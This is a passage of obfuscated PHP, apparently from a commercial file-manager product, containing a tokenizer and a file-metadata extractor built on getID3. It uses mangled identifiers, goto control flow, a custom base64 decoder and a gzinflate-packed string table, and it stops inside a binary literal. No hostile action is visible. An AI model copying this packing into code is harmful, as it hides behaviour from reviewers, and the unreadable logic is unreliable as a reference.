$eë°»­§Œö[$B™©£šòå¯]; switch ($Bæ©¥©ª”) { case $dˆ½Šš«‚[1597]: $e å¢ê•Óˆ = strcspn($eë°»­§Œö, $dˆ½Šš«‚[1598], $B™©£šòå¯); if ($e å¢ê•Óˆ > 0) { $B™©£šòå¯ += $e å¢ê•Óˆ; return self::getRawObject($eë°»­§Œö, $B™©£šòå¯); } break; case $dˆ½Šš«‚[8]: $aÎ¶¤œŠ›  = $Bæ©¥©ª”; ++$B™©£šòå¯; $EŒ˜ÀÌä™Â = preg_match($dˆ½Šš«‚[1599], substr($eë°»­§Œö, $B™©£šòå¯, 256), $cà„ŞâÇø™); if (1 == $EŒ˜ÀÌä™Â) { $C´Í“æ½¸ = $cà„ŞâÇø™[1]; $B™©£šòå¯ += strlen($C´Í“æ½¸); } break; case $dˆ½Šš«‚[248]: case $dˆ½Šš«‚[820]: $aÎ¶¤œŠ›  = $Bæ©¥©ª”; ++$B™©£šòå¯; $dçààïäÒ¨ = $B™©£šòå¯; if ($dˆ½Šš«‚[248] == $Bæ©¥©ª”) { $bƒÛƒí‘À‰ = 1; while ($bƒÛƒí‘À‰ > 0) { if (!isset($eë°»­§Œö[$dçààïäÒ¨])) { break; } $D­“‚„ÓÎƒ = $eë°»­§Œö[$dçààïäÒ¨]; switch ($D­“‚„ÓÎƒ) { case $dˆ½Šš«‚[93]: ++$dçààïäÒ¨; break; case $dˆ½Šš«‚[248]: ++$bƒÛƒí‘À‰; break; case $dˆ½Šš«‚[820]: --$bƒÛƒí‘À‰; break; } ++$dçààïäÒ¨; } $C´Í“æ½¸ = substr($eë°»­§Œö, $B™©£šòå¯, $dçààïäÒ¨ - $B™©£šòå¯ - 1); $B™©£šòå¯ = $dçààïäÒ¨; } break; case $dˆ½Šš«‚[157]: case $dˆ½Šš«‚[478]: $aÎ¶¤œŠ›  = $Bæ©¥©ª”; ++$B™©£šòå¯; if ($dˆ½Šš«‚[157] == $Bæ©¥©ª”) { $C´Í“æ½¸ = array(); do { $f£­ÂùÒÚ = $B™©£šòå¯; $D¥°ŒÆÍŞÄ = self::getRawObject($eë°»­§Œö, $B™©£šòå¯); $B™©£šòå¯ = $D¥°ŒÆÍŞÄ[2]; $C´Í“æ½¸[] = $D¥°ŒÆÍŞÄ; } while ($dˆ½Šš«‚[478] != $D¥°ŒÆÍŞÄ[0] && $B™©£šòå¯ != $f£­ÂùÒÚ); array_pop($C´Í“æ½¸); } break; case $dˆ½Šš«‚[928]: case $dˆ½Šš«‚[931]: if (isset($eë°»­§Œö[$B™©£šòå¯ + 1]) && $eë°»­§Œö[$B™©£šòå¯ + 1] == $Bæ©¥©ª”) { $aÎ¶¤œŠ›  = $Bæ©¥©ª” . $Bæ©¥©ª”; $B™©£šòå¯ += 2; if ($dˆ½Šš«‚[928] == $Bæ©¥©ª”) { $C´Í“æ½¸ = array(); do { $f£­ÂùÒÚ = $B™©£šòå¯; $D¥°ŒÆÍŞÄ = self::getRawObject($eë°»­§Œö, $B™©£šòå¯); $B™©£šòå¯ = $D¥°ŒÆÍŞÄ[2]; $C´Í“æ½¸[] = $D¥°ŒÆÍŞÄ; } while ($dˆ½Šš«‚[1600] != $D¥°ŒÆÍŞÄ[0] && $B™©£šòå¯ != $f£­ÂùÒÚ); array_pop($C´Í“æ½¸); } } else { $aÎ¶¤œŠ›  = $Bæ©¥©ª”; ++$B™©£šòå¯; $EŒ˜ÀÌä™Â = preg_match($dˆ½Šš«‚[1601], substr($eë°»­§Œö, $B™©£šòå¯), $cà„ŞâÇø™); if ($dˆ½Šš«‚[928] == $Bæ©¥©ª” && 1 == $EŒ˜ÀÌä™Â) { $C´Í“æ½¸ = strtr($cà„ŞâÇø™[1], $dˆ½Šš«‚[1602], $dˆ½Šš«‚[33]); $B™©£šòå¯ += \strlen($cà„ŞâÇø™[0]); } elseif (!1 !== ($aŞÜÔŠì‹İ = strpos($eë°»­§Œö, $dˆ½Šš«‚[931], $B™©£šòå¯))) { $B™©£šòå¯ = $aŞÜÔŠì‹İ + 1; } } break; default: if ($dˆ½Šš«‚[1603] == substr($eë°»­§Œö, $B™©£šòå¯, 6)) { $aÎ¶¤œŠ›  = $dˆ½Šš«‚[1603]; $B™©£šòå¯ += 6; } elseif ($dˆ½Šš«‚[99] == substr($eë°»­§Œö, $B™©£šòå¯, 4)) { $aÎ¶¤œŠ›  = $dˆ½Šš«‚[99]; $B™©£šòå¯ += 4; $C´Í“æ½¸ = $dˆ½Šš«‚[99]; } elseif ($dˆ½Šš«‚[1604] == substr($eë°»­§Œö, $B™©£šòå¯, 4)) { $aÎ¶¤œŠ›  = $dˆ½Šš«‚[1605]; $B™©£šòå¯ += 4; $C´Í“æ½¸ = $dˆ½Šš«‚[1604]; } elseif ($dˆ½Šš«‚[1606] == substr($eë°»­§Œö, $B™©£šòå¯, 5)) { $aÎ¶¤œŠ›  = $dˆ½Šš«‚[1605]; $B™©£šòå¯ += 5; $C´Í“æ½¸ = $dˆ½Šš«‚[1606]; } elseif ($dˆ½Šš«‚[1607] == substr($eë°»­§Œö, $B™©£šòå¯, 6)) { $aÎ¶¤œŠ›  = $dˆ½Šš«‚[1607]; $B™©£šòå¯ += 6; if (1 == preg_match($dˆ½Šš«‚[1608], substr($eë°»­§Œö, $B™©£šòå¯), $cà„ŞâÇø™)) { $B™©£šòå¯ += strlen($cà„ŞâÇø™[0]); $Aíîìâ = $dˆ½Šš«‚[1609]; $EŒ˜ÀÌä™Â = preg_match($Aíîìâ, substr($eë°»­§Œö, $B™©£šòå¯), $cà„ŞâÇø™, PREG_OFFSET_CAPTURE); if (1 == $EŒ˜ÀÌä™Â) { $C´Í“æ½¸ = substr($eë°»­§Œö, $B™©£šòå¯, $cà„ŞâÇø™[0][1]); $B™©£šòå¯ += $cà„ŞâÇø™[1][1]; } } } elseif ($dˆ½Šš«‚[1610] == substr($eë°»­§Œö, $B™©£šòå¯, 9)) { $aÎ¶¤œŠ›  = $dˆ½Šš«‚[1610]; $B™©£šòå¯ += 9; } elseif (1 == preg_match($dˆ½Šš«‚[1611], substr($eë°»­§Œö, $B™©£šòå¯, 33), $cà„ŞâÇø™)) { $aÎ¶¤œŠ›  = $dˆ½Šš«‚[1573]; $B™©£šòå¯ += strlen($cà„ŞâÇø™[0]); $C´Í“æ½¸ = intval($cà„ŞâÇø™[1]) . $dˆ½Šš«‚[70] . intval($cà„ŞâÇø™[2]); } elseif (1 == preg_match($dˆ½Šš«‚[1612], substr($eë°»­§Œö, $B™©£šòå¯, 33), $cà„ŞâÇø™)) { $aÎ¶¤œŠ›  = $dˆ½Šš«‚[1613]; $C´Í“æ½¸ = intval($cà„ŞâÇø™[1]) . $dˆ½Šš«‚[70] . intval($cà„ŞâÇø™[2]); $B™©£šòå¯ += strlen($cà„ŞâÇø™[0]); } elseif (($Dµ™œËÛ = strspn($eë°»­§Œö, $dˆ½Šš«‚[1614], $B™©£šòå¯)) > 0) { $aÎ¶¤œŠ›  = $dˆ½Šš«‚[1615]; $C´Í“æ½¸ = substr($eë°»­§Œö, $B™©£šòå¯, $Dµ™œËÛ); $B™©£šòå¯ += $Dµ™œËÛ; } break; } goto fÂ®×ÙŞ›é; B°ó„³¾¾ö: $dˆ½Šš«‚ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $aÎ¶¤œŠ›  = $dˆ½Šš«‚[33]; $C´Í“æ½¸ = $dˆ½Šš«‚[33]; goto d¬Ì–öâÔœ; fÂ®×ÙŞ›é: return array($aÎ¶¤œŠ› , $C´Í“æ½¸, $B™©£šòå¯); goto F˜äÕ‚ˆ¬Á; F˜äÕ‚ˆ¬Á: } } class GetInfo { private static $fileTypeArray; public static function get($AñÕ“°âæ) { $AÎàª‹õ’ = IO::info($AñÕ“°âæ); return self::infoAdd($AÎàª‹õ’); } public static function check() { } public static function infoAdd(&$DÏåó×ÊÒ„) { goto c„Šì´ƒ¢˜; B ÛµÑ»éÃ: $EÄ‡‡ˆøÙŞ = $DÏåó×ÊÒ„[$fˆÉàÎÉÃİ[160]]; try { if ($DÏåó×ÊÒ„[$fˆÉàÎÉÃİ[160]] == $fˆÉàÎÉÃİ[1618]) { $f¦™¾ïŠ = self::psdParse($Cë‹Şã¢); $EÄ‡‡ˆøÙŞ = $fˆÉàÎÉÃİ[1619]; } else { if ($DÏåó×ÊÒ„[$fˆÉàÎÉÃİ[160]] == $fˆÉàÎÉÃİ[1620]) { $f¦™¾ïŠ = self::pdfParse($Cë‹Şã¢); } else { $EÄ‡‡ˆøÙŞ = self::$fileTypeArray[$fˆÉàÎÉÃİ[1621]][$DÏåó×ÊÒ„[$fˆÉàÎÉÃİ[160]]]; $b«¬‡òË×š = self::$fileTypeArray[$fˆÉàÎÉÃİ[1622]][$EÄ‡‡ˆøÙŞ][$fˆÉàÎÉÃİ[1623]]; $aôØÔí³•è = @$dƒ“§¡Å Ğ->analyze($Cë‹Şã¢, $DÏåó×ÊÒ„[$fˆÉàÎÉÃİ[77]], $DÏåó×ÊÒ„[$fˆÉàÎÉÃİ[28]]); $f¦™¾ïŠ = self::parseData($aôØÔí³•è, $b«¬‡òË×š, $DÏåó×ÊÒ„); } } } catch (Exception $d²‘ºâçà‘) { $f¦™¾ïŠ = array($fˆÉàÎÉÃİ[372] => $EÄ‡‡ˆøÙŞ); } if (!$f¦™¾ïŠ) { return; } goto A”£¬îæõ¼; A”£¬îæõ¼: $f¦™¾ïŠ = self::arrayValueLimit($f¦™¾ïŠ); $f¦™¾ïŠ[$fˆÉàÎÉÃİ[372]] = $EÄ‡‡ˆøÙŞ; $DÏåó×ÊÒ„[$fˆÉàÎÉÃİ[426]] = $f¦™¾ïŠ; goto c¿¤©±†è‰; c¿¤©±†è‰: return $DÏåó×ÊÒ„; goto Fæ˜ªî°Ñ‰; c„Šì´ƒ¢˜: $fˆÉàÎÉÃİ =& $_SERVER[´Ù×Íå‘ÄõÛ]; static $dƒ“§¡Å Ğ; if (!$dƒ“§¡Å Ğ) { require SDK_DIR . $fˆÉàÎÉÃİ[1616]; $dƒ“§¡Å Ğ = new getID3(); } goto a‘‘‹¿İ’; a‘‘‹¿İ’: if (!$DÏåó×ÊÒ„ || $DÏåó×ÊÒ„[$fˆÉàÎÉÃİ[29]] != $fˆÉàÎÉÃİ[167]) { return; } if (!self::support($DÏåó×ÊÒ„[$fˆÉàÎÉÃİ[160]]) || isset($DÏåó×ÊÒ„[$fˆÉàÎÉÃİ[426]])) { return; } $Cë‹Şã¢ = $fˆÉàÎÉÃİ[1617] . $DÏåó×ÊÒ„[$fˆÉàÎÉÃİ[75]]; goto B ÛµÑ»éÃ; Fæ˜ªî°Ñ‰: } public static function support($Eî¤¶î°¤¨) { goto e„§ÕÉ¨í®; b¨ö©ƒÇæ: return !1; goto EôëâƒÕ; BÒÄËØ³‰: $cŠé¼â—¼é = array($c¬ˆŠçÎáÉ[1620], $c¬ˆŠçÎáÉ[1618]); if (in_array($Eî¤¶î°¤¨, $cŠé¼â—¼é)) { return !0; } if (isset(self::$fileTypeArray[$c¬ˆŠçÎáÉ[1621]][$Eî¤¶î°¤¨])) { return !0; } goto b¨ö©ƒÇæ; e„§ÕÉ¨í®: $c¬ˆŠçÎáÉ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!self::$fileTypeArray) { self::$fileTypeArray = self::fileTypeParse(); } $Eî¤¶î°¤¨ = strtolower($Eî¤¶î°¤¨); goto BÒÄËØ³‰; EôëâƒÕ: } public static function arrayValueLimit($BÊ•É¹Šªš, $D¬Œ§”Èî… = 5000) { if (!is_array($BÊ•É¹Šªš)) { return $BÊ•É¹Šªš; } foreach ($BÊ•É¹Šªš as $cÎç¢ ‹Ú => $f¯ã¯¾µ‘›) { if (is_string($f¯ã¯¾µ‘›) && strlen($f¯ã¯¾µ‘›) > $D¬Œ§”Èî…) { $BÊ•É¹Šªš[$cÎç¢ ‹Ú] = substr($f¯ã¯¾µ‘›, 0, $D¬Œ§”Èî…); } else { if (is_array($f¯ã¯¾µ‘›)) { $BÊ•É¹Šªš[$cÎç¢ ‹Ú] = self::arrayValueLimit($f¯ã¯¾µ‘›, $D¬Œ§”Èî…); } } } return $BÊ•É¹Šªš; } private static function parseData($dœ…ëÖßĞ±, $F‚‘¿¶êÍ, $dÅ¼™ˆ©†­) { $bÖ“ˆ©…”ä =& $_SERVER[´Ù×Íå‘ÄõÛ]; $e¼‚ŞŠœ‡ = $dœ…ëÖßĞ±[$bÖ“ˆ©…”ä[1624]]; $a£¶ÅÎø²© = array(); foreach ($F‚‘¿¶êÍ as $aäñ³Âé‡– => $cÄ¬Ã¤µé) { foreach ($cÄ¬Ã¤µé as $f‘Û¡ «Ë) { if (is_array($f‘Û¡ «Ë)) { $Cç·ˆïñÇ = self::parseData($dœ…ëÖßĞ±, $cÄ¬Ã¤µé, $dÅ¼™ˆ©†­); if ($Cç·ˆïñÇ) { $a£¶ÅÎø²©[$aäñ³Âé‡–] = $Cç·ˆïñÇ; } break; } $DïŒ”ÊñÉ = str_replace($bÖ“ˆ©…”ä[1394], $e¼‚ŞŠœ‡, $f‘Û¡ «Ë); $Cç·ˆïñÇ = _get($dœ…ëÖßĞ±, $DïŒ”ÊñÉ); $Cç·ˆïñÇ = is_array($Cç·ˆïñÇ) ? $Cç·ˆïñÇ[0] : $Cç·ˆïñÇ; if ($Cç·ˆïñÇ) { break; } } if ($Cç·ˆïñÇ || $Cç·ˆïñÇ === 0 || $Cç·ˆïñÇ === !1) { $Cç·ˆïñÇ = self::valueReset($f‘Û¡ «Ë, $Cç·ˆïñÇ, $aäñ³Âé‡–); if ($Cç·ˆïñÇ !== null) { $a£¶ÅÎø²©[$aäñ³Âé‡–] = $Cç·ˆïñÇ; } } } $a£¶ÅÎø²© = self::valueResetAll($a£¶ÅÎø²©, $dÅ¼™ˆ©†­); return $a£¶ÅÎø²©; } private static function psdParse($CÒíæäí) { $cÈˆ‹Œ³ò =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (IO::fileSubstr($CÒíæäí, 0, 4) != $cÈˆ‹Œ³ò[1625]) { return !1; } $DÀ±ÉÀÓ¾’ = getImageSize($CÒíæäí, $C¦ÖÉÅÓÂÇ); if (!$DÀ±ÉÀÓ¾’) { return; } $AÍé¦œĞ™Ö = array($cÈˆ‹Œ³ò[1540] => $DÀ±ÉÀÓ¾’[0], $cÈˆ‹Œ³ò[1542] => $DÀ±ÉÀÓ¾’[1]); return $AÍé¦œĞ™Ö; } private static function pdfParse($eÈé«¶£³) { return FileParsePdf::parse($eÈé«¶£³); } private static function fileTypeParse() { $f¥–™”ò†Ü =& $_SERVER[´Ù×Íå‘ÄõÛ]; $FÓ²ÌÁßŠ = self::fileTypeArray(); $bÚ§Ô™À± = array(); foreach ($FÓ²ÌÁßŠ as $B§¿ä°îÛÄ => $aÀñ–ïğ™) { $d¶’â”ÙÜã = _get($aÀñ–ïğ™, $f¥–™”ò†Ü[160], $f¥–™”ò†Ü[33]); $Eª×ñÔÀÅŞ = is_string($d¶’â”ÙÜã) ? explode($f¥–™”ò†Ü[47], $d¶’â”ÙÜã) : $d¶’â”ÙÜã; if (!$Eª×ñÔÀÅŞ) { continue; } foreach ($Eª×ñÔÀÅŞ as $d¶’â”ÙÜã) { $d¶’â”ÙÜã = strtolower(trim($d¶’â”ÙÜã)); if (!$d¶’â”ÙÜã) { continue; } $bÚ§Ô™À±[$d¶’â”ÙÜã] = $B§¿ä°îÛÄ; } $FÓ²ÌÁßŠ[$B§¿ä°îÛÄ][$f¥–™”ò†Ü[160]] = array_keys($bÚ§Ô™À±); $FÓ²ÌÁßŠ[$B§¿ä°îÛÄ][$f¥–™”ò†Ü[1623]] = self::parseKeyMap($aÀñ–ïğ™[$f¥–™”ò†Ü[1623]]); } return array($f¥–™”ò†Ü[1622] => $FÓ²ÌÁßŠ, $f¥–™”ò†Ü[1621] => $bÚ§Ô™À±); } private static function parseKeyMap($e§²±—ÚÙ¢) { $d†ÚÇä¿šÆ =& $_SERVER[´Ù×Íå‘ÄõÛ]; foreach ($e§²±—ÚÙ¢ as $CÊŒˆ¬Úî => $F²õ¢¿ÃÌ) { if (is_array($F²õ¢¿ÃÌ)) { $BîÊ‡Û¬ñ· = self::parseKeyMap($F²õ¢¿ÃÌ); if ($BîÊ‡Û¬ñ·) { $e§²±—ÚÙ¢[$CÊŒˆ¬Úî] = $BîÊ‡Û¬ñ·; } continue; } $a¡ì–š£ôŒ = explode($d†ÚÇä¿šÆ[47], $F²õ¢¿ÃÌ); $c“ãØ÷¹’’ = array(); foreach ($a¡ì–š£ôŒ as $A˜Ü•ºá–Â) { $A˜Ü•ºá–Â = trim($A˜Ü•ºá–Â); if (!$A˜Ü•ºá–Â) { continue; } if (preg_match($d†ÚÇä¿šÆ[1626], $A˜Ü•ºá–Â, $b‡õÌ³Åê)) { $C»êÓËÂŸ‡ = explode($d†ÚÇä¿šÆ[271], $b‡õÌ³Åê[1]); foreach ($C»êÓËÂŸ‡ as $F¾¿‘÷ÃÜ) { $c“ãØ÷¹’’[] = str_replace($b‡õÌ³Åê[0], $F¾¿‘÷ÃÜ, $A˜Ü•ºá–Â); } } else { $c“ãØ÷¹’’[] = $A˜Ü•ºá–Â; } } $e§²±—ÚÙ¢[$CÊŒˆ¬Úî] = $c“ãØ÷¹’’; } return $e§²±—ÚÙ¢; } private static function valueResetAll($AÒ•Á„Ì±Í, $FİÈšÚ©ƒ) { goto BÒ©ã˜ÂÏ£; a“â“ôÙêİ: $DÈ¦öœİè¦ = _get($AÒ•Á„Ì±Í, $Dêé˜ÀëŠÉ[1639], $Dêé˜ÀëŠÉ[33]); $dŸ“ÀŒ½šË = $E‡ö‹ êÈÂ . $c¥©ø¡åÍ… . $DÈ¦öœİè¦; if ($dŸ“ÀŒ½šË && get_charset($dŸ“ÀŒ½šË) != $Dêé˜ÀëŠÉ[326]) { $AÒ•Á„Ì±Í[$Dêé˜ÀëŠÉ[1636]][$Dêé˜ÀëŠÉ[1347]] = iconv_to($AÒ•Á„Ì±Í[$Dêé˜ÀëŠÉ[1636]][$Dêé˜ÀëŠÉ[1347]], get_charset($dŸ“ÀŒ½šË), $Dêé˜ÀëŠÉ[326]); $AÒ•Á„Ì±Í[$Dêé˜ÀëŠÉ[1636]][$Dêé˜ÀëŠÉ[1640]] = iconv_to($AÒ•Á„Ì±Í[$Dêé˜ÀëŠÉ[1636]][$Dêé˜ÀëŠÉ[1640]], get_charset($dŸ“ÀŒ½šË), $Dêé˜ÀëŠÉ[326]); $AÒ•Á„Ì±Í[$Dêé˜ÀëŠÉ[1636]][$Dêé˜ÀëŠÉ[1641]] = iconv_to($AÒ•Á„Ì±Í[$Dêé˜ÀëŠÉ[1636]][$Dêé˜ÀëŠÉ[1641]], get_charset($dŸ“ÀŒ½šË), $Dêé˜ÀëŠÉ[326]); } goto bíŸ¡îÌê; BÒ©ã˜ÂÏ£: $Dêé˜ÀëŠÉ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (isset($AÒ•Á„Ì±Í[$Dêé˜ÀëŠÉ[1627]])) { $f¯³Ë©öã = ceil($AÒ•Á„Ì±Í[$Dêé˜ÀëŠÉ[1627]]); $e„ƒ‡š‡œŒ = intval($f¯³Ë©öã / 3600); $f¤£ŠŠ·¤† = intval(($f¯³Ë©öã - $e„ƒ‡š‡œŒ * 3600) / 60); $dÍöÙóà–Ù = $f¯³Ë©öã % 60; $AÒ•Á„Ì±Í[$Dêé˜ÀëŠÉ[1628]] = sprintf($Dêé˜ÀëŠÉ[1629], $e„ƒ‡š‡œŒ, $f¤£ŠŠ·¤†, $dÍöÙóà–Ù); if ($e„ƒ‡š‡œŒ == 0) { $AÒ•Á„Ì±Í[$Dêé˜ÀëŠÉ[1628]] = sprintf($Dêé˜ÀëŠÉ[1630], $f¤£ŠŠ·¤†, $dÍöÙóà–Ù); } } $c‡Íîç¨ = _get($AÒ•Á„Ì±Í, $Dêé˜ÀëŠÉ[1631]); goto aŒÖèáÑœæ; aŒÖèáÑœæ: if ($c‡Íîç¨) { $eİÇåìÁË™ = IO_PATH_SYSTEM_TEMP . $Dêé˜ÀëŠÉ[1632] . KodIO::hashPath($FİÈšÚ©ƒ) . $Dêé˜ÀëŠÉ[1633]; $AÒ•Á„Ì±Í[$Dêé˜ÀëŠÉ[1634]] = Action($Dêé˜ÀëŠÉ[1635])->pluginCacheFileSet($eİÇåìÁË™, $c‡Íîç¨); unset($AÒ•Á„Ì±Í[$Dêé˜ÀëŠÉ[1636]][$Dêé˜ÀëŠÉ[1619]]); } $E‡ö‹ êÈÂ = _get($AÒ•Á„Ì±Í, $Dêé˜ÀëŠÉ[1637], $Dêé˜ÀëŠÉ[33]); $c¥©ø¡åÍ… = _get($AÒ•Á„Ì±Í, $Dêé˜ÀëŠÉ[1638], $Dêé˜ÀëŠÉ[33]); goto a“â“ôÙêİ; bíŸ¡îÌê: return $AÒ•Á„Ì±Í; goto cğÀ†õùÎ„; cğÀ†õùÎ„: } private static function valueReset($Aºã¸Á…–’, $eÁÚ†×ˆƒ‚, $c¤ÏÔÓ¤—ª) { $e¸…Èõ“…¹ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $eá±´¾Ê·© = $e¸…Èõ“…¹[1557]; switch ($Aºã¸Á…–’) { case $e¸…Èõ“…¹[1642]: $eÁÚ†×ˆƒ‚ = $eÁÚ†×ˆƒ‚ == $e¸…Èõ“…¹[83] ? $e¸…Èõ“…¹[1643] : $e¸…Èõ“…¹[1644]; break; case $e¸…Èõ“…¹[1645]: $eÁÚ†×ˆƒ‚ = $eÁÚ†×ˆƒ‚ ? $eÁÚ†×ˆƒ‚ : null; break; default: break; } switch ($c¤ÏÔÓ¤—ª) { case $e¸…Èõ“…¹[1646]: $eÁÚ†×ˆƒ‚ = round($eÁÚ†×ˆƒ‚, 2); break; case $e¸…Èõ“…¹[187]: case $e¸…Èõ“…¹[107]: if ($eÁÚ†×ˆƒ‚ < 0) { $eÁÚ†×ˆƒ‚ = null; } else { if (is_numeric($eÁÚ†×ˆƒ‚)) { $eÁÚ†×ˆƒ‚ = date($eá±´¾Ê·©, $eÁÚ†×ˆƒ‚); } } break; default: break; } return $eÁÚ†×ˆƒ‚; } private static function fileTypeArray() { $d©…®Áç‰î =& $_SERVER[´Ù×Íå‘ÄõÛ]; return array($d©…®Áç‰î[1619] => array($d©…®Áç‰î[160] => $d©…®Áç‰î[1647] . $d©…®Áç‰î[1648], $d©…®Áç‰î[1623] => array($d©…®Áç‰î[1540] => $d©…®Áç‰î[1649], $d©…®Áç‰î[1542] => $d©…®Áç‰î[1650], $d©…®Áç‰î[1651] => $d©…®Áç‰î[1652], $d©…®Áç‰î[1653] => $d©…®Áç‰î[1654], $d©…®Áç‰î[187] => $d©…®Áç‰î[1655], $d©…®Áç‰î[107] => $d©…®Áç‰î[1656], $d©…®Áç‰î[1657] => $d©…®Áç‰î[1658], $d©…®Áç‰î[1659] => $d©…®Áç‰î[1660], $d©…®Áç‰î[1661] => $d©…®Áç‰î[1662], $d©…®Áç‰î[1663] => $d©…®Áç‰î[1664], $d©…®Áç‰î[1665] => $d©…®Áç‰î[1666], $d©…®Áç‰î[1667] => $d©…®Áç‰î[1668], $d©…®Áç‰î[1669] => $d©…®Áç‰î[1670], $d©…®Áç‰î[1671] => array($d©…®Áç‰î[1672] => $d©…®Áç‰î[1673], $d©…®Áç‰î[1674] => $d©…®Áç‰î[1675], $d©…®Áç‰î[1676] => $d©…®Áç‰î[1677]), $d©…®Áç‰î[1678] => $d©…®Áç‰î[1679], $d©…®Áç‰î[1680] => $d©…®Áç‰î[1681], $d©…®Áç‰î[1682] => $d©…®Áç‰î[1683], $d©…®Áç‰î[1684] => $d©…®Áç‰î[1685], $d©…®Áç‰î[1686] => array($d©…®Áç‰î[1687] => $d©…®Áç‰î[1688], $d©…®Áç‰î[1689] => $d©…®Áç‰î[1690], $d©…®Áç‰î[1691] => $d©…®Áç‰î[1692], $d©…®Áç‰î[1693] => $d©…®Áç‰î[1694], $d©…®Áç‰î[1695] => $d©…®Áç‰î[1696], $d©…®Áç‰î[1697] => $d©…®Áç‰î[1698], $d©…®Áç‰î[1699] => $d©…®Áç‰î[1700], $d©…®Áç‰î[1701] => $d©…®Áç‰î[1702], $d©…®Áç‰î[1703] => $d©…®Áç‰î[1704], $d©…®Áç‰î[1705] => $d©…®Áç‰î[1706], $d©…®Áç‰î[1707] => $d©…®Áç‰î[1708]))), $d©…®Áç‰î[1709] => array($d©…®Áç‰î[160] => $d©…®Áç‰î[1710] . $d©…®Áç‰î[1711], $d©…®Áç‰î[1623] => array($d©…®Áç‰î[1627] => $d©…®Áç‰î[1712], $d©…®Áç‰î[187] => $d©…®Áç‰î[1713], $d©…®Áç‰î[107] => $d©…®Áç‰î[1714], $d©…®Áç‰î[1659] => $d©…®Áç‰î[1715], $d©…®Áç‰î[1716] => $d©…®Áç‰î[1717], $d©…®Áç‰î[1718] => $d©…®Áç‰î[1645], $d©…®Áç‰î[1719] => $d©…®Áç‰î[1720], $d©…®Áç‰î[1721] => $d©…®Áç‰î[1722], $d©…®Áç‰î[1723] => $d©…®Áç‰î[1724], $d©…®Áç‰î[1636] => array($d©…®Áç‰î[1347] => $d©…®Áç‰î[1725], $d©…®Áç‰î[1640] => $d©…®Áç‰î[1726], $d©…®Áç‰î[1641] => $d©…®Áç‰î[1727], $d©…®Áç‰î[1728] => $d©…®Áç‰î[1729], $d©…®Áç‰î[1730] => $d©…®Áç‰î[1731], $d©…®Áç‰î[1732] => $d©…®Áç‰î[1733], $d©…®Áç‰î[1619] => $d©…®Áç‰î[1734]))), $d©…®Áç‰î[1735] => array($d©…®Áç‰î[160] => $d©…®Áç‰î[1736] . $d©…®Áç‰î[1737], $d©…®Áç‰î[1623] => array($d©…®Áç‰î[1540] => $d©…®Áç‰î[1738], $d©…®Áç‰î[1542] => $d©…®Áç‰î[1739], $d©…®Áç‰î[1627] => $d©…®Áç‰î[1712], $d©…®Áç‰î[187] => $d©…®Áç‰î[1740], $d©…®Áç‰î[107] => $d©…®Áç‰î[1741], $d©…®Áç‰î[1646] => $d©…®Áç‰î[1742], $d©…®Áç‰î[1723] => $d©…®Áç‰î[1743], $d©…®Áç‰î[1719] => $d©…®Áç‰î[1744], $d©…®Áç‰î[1659] => $d©…®Áç‰î[1745], $d©…®Áç‰î[1709] => array($d©…®Áç‰î[1718] => $d©…®Áç‰î[1645], $d©…®Áç‰î[1746] => $d©…®Áç‰î[1747], $d©…®Áç‰î[1716] => $d©…®Áç‰î[1717], $d©…®Áç‰î[1723] => $d©…®Áç‰î[1724], $d©…®Áç‰î[1719] => $d©…®Áç‰î[1748], $d©…®Áç‰î[1721] => $d©…®Áç‰î[1722]))), $d©…®Áç‰î[1749] => array($d©…®Áç‰î[1623] => array($d©…®Áç‰î[1750] => $d©…®Áç‰î[1751], $d©…®Áç‰î[1752] => $d©…®Áç‰î[1753])), $d©…®Áç‰î[1754] => array($d©…®Áç‰î[1623] => array())); } } goto fŸ–ÉÂâÒ’; AÛñÒãóè: if (!function_exists('_kodDe')) { function _kodDe($Fœç¶Ô¼·À) { $Fœç¶Ô¼·À = base64_decode($Fœç¶Ô¼·À); $A˜›Ò›£éÃ = strlen($Fœç¶Ô¼·À); $dƒøŞôÆ = ''; $A–å»ˆÑòÍ = ord($Fœç¶Ô¼·À[0]) - 30; for ($a¢Ø¨œØŸÊ = 1; $a¢Ø¨œØŸÊ < $A˜›Ò›£éÃ; $a¢Ø¨œØŸÊ += 2) { if ($a¢Ø¨œØŸÊ + 1 < $A˜›Ò›£éÃ) { $dƒøŞôÆ .= chr(ord($Fœç¶Ô¼·À[$a¢Ø¨œØŸÊ + 1]) + $A–å»ˆÑòÍ); $dƒøŞôÆ .= chr(ord($Fœç¶Ô¼·À[$a¢Ø¨œØŸÊ]) + $A–å»ˆÑòÍ); } else { $dƒøŞôÆ .= chr(ord($Fœç¶Ô¼·À[$a¢Ø¨œØŸÊ]) + $A–å»ˆÑòÍ); } } return $dƒøŞôÆ; } } define("\xb4\xd9\xd7\xcd\xe5\x91\xc4\xf5\xdb", "\xad\x86"); $_SERVER[´Ù×Íå‘ÄõÛ] = explode("\174\1\174\2\174\4", gzinflate(substr(strrev('>JîÊ´–6’´•”rÁ8ä–Ø‹l’È!%|:;aÉ”)i@´rÙÊPÕÅx	='."\0".''."\0".''."\0".''."\0".''."\0".''."\0".'‹')."\222\224\2\205\66\204\160\65\201\2\241\345\276\112\102\12\1\22\150\240\55\55\205\237\162\225\243\264\120\312\221\203\233\226\273\345\7\376\271\147\166\45\103\373\363\21\153\346\315\233\331\71\336\274\171\63\363\336"."\233\167\376\372\311\173\147\77\372\322\352\175\127\177\145\365\127\357\172\376\41\34\0\177\367\135\275\77\16\237\260\356\240\175\320\177\373\345\117\351\17\176\245\361\210\365\7\272\77\73\144\340\147\137\237\376\302\332".strrev('şïcxVãıfc:ş[_ù½îoyüü½